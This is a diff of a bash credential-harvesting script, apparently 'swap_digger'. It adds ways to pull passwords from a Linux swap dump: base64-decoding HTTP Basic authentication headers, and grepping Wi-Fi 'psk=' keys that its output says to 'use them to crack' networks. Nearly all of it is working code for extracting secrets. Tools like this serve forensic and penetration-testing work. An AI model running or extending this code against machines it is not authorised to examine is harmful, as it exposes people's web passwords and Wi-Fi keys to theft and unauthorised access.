@@ -146,7 +146,7 @@ function dig_web_info () {
     out
     blue " ==== Web entered passwords and emails ==="
     out
-    out " [+] Looking for web passwords method 1..."
+    out " [+] Looking for web passwords method 1 (password in GET/POST)..."
     OLDIFS=$IFS; IFS=$'\n';
     for entry in `grep "&password=" "$swap_dump_path"`
     do
@@ -161,7 +161,7 @@ function dig_web_info () {
     IFS=$OLDIFS
     out
     out
-    echo " [+] Looking for web passwords method 2..."
+    echo " [+] Looking for web passwords method 2 (JSON) ..."
     OLDIFS=$IFS; IFS=$'\n';
     for entry in `grep "password\",\"value\":\"" "$swap_dump_path"`
     do
@@ -173,6 +173,20 @@ function dig_web_info () {
             passwordList=("${passwordList[@]}" "$password") # Add found password to list
         fi
 
+    done
+    IFS=$OLDIFS
+    out
+    out
+    echo " [+] Looking for web passwords method 3 (HTTP Basic Authentication) ..."
+    OLDIFS=$IFS; IFS=$'\n';
+    for entry in `grep -E '^Authorization: Basic.+=$' "$swap_dump_path" | cut -d' ' -f 3`
+    do
+        CREDS="$(echo "$entry" | base64 -d)"
+        if [[ "$CREDS" ]]; then
+            out "   [-] $CREDS"
+            password=`echo "$CREDS" | cut -f 2 -d ":"`
+            passwordList=("${passwordList[@]}" "$password") # Add found password to list
+        fi
     done
     IFS=$OLDIFS
     # Looking for web entered email address
@@ -207,7 +221,7 @@ function dig_wifi_info () {
     blue " ==== WiFi ==="
     out
     out " [+] Looking for wifi access points..."
-    wifiNetworks=`grep -C 10  "Auto "  /tmp/swap_dig/swap_dump.txt | grep -C 10 wireless | grep "Auto " | grep -v "NetworkManager" | cut -d " " -f 2,3,4 | sort | uniq`
+    wifiNetworks=`grep -C 10  "Auto "  "$swap_dump_path" | grep -C 10 wireless | grep "Auto " | grep -v "NetworkManager" | cut -d " " -f 2,3,4 | sort | uniq`
     out "   [-] Potential wifi network list this computer accessed to:"
     OLDIFS=$IFS; IFS=$'\n';
     for accesspoint in $wifiNetworks
@@ -217,10 +231,20 @@ function dig_wifi_info () {
     IFS=$OLDIFS
     out
     out " [+] Looking for potential Wifi passwords...."
-    wifiPasswords=`grep -C 10  "Auto "  /tmp/swap_dig/swap_dump.txt | grep -A2 wpa-psk | egrep -v "wpa|addresses|NetworkManager|Auto|wireless|--|NMSetting" | sort | uniq`
+    wifiPasswords1=`grep -C 10  "Auto "  "$swap_dump_path" | grep -A2 wpa-psk | egrep -v "wpa|addresses|NetworkManager|Auto|wireless|--|NMSetting" | sort | uniq`
     out "   [-] Potential wifi password list (use them to crack above networks)"
     OLDIFS=$IFS; IFS=$'\n';
-    for password in $wifiPasswords
+    for password in $wifiPasswords1
+    do
+        out "$password"
+    done
+    IFS=$OLDIFS
+        out
+    out " [+] Looking for potential Wifi passwords method 2...."
+    wifiPasswords2=`grep -o 'psk=.\+' "$swap_dump_path" | cut -f 2 -d '=' | sort | uniq`
+    out "   [-] Potential wifi password list (use them to crack above networks)"
+    OLDIFS=$IFS; IFS=$'\n';
+    for password in $wifiPasswords2
     do
         out "$password"
     done
@@ -451,4 +475,7 @@ swap_digger
 end
 
 
-
+# TODO
+# cat /proc/swaps
+# PASS=
+# /dev/tmpfs
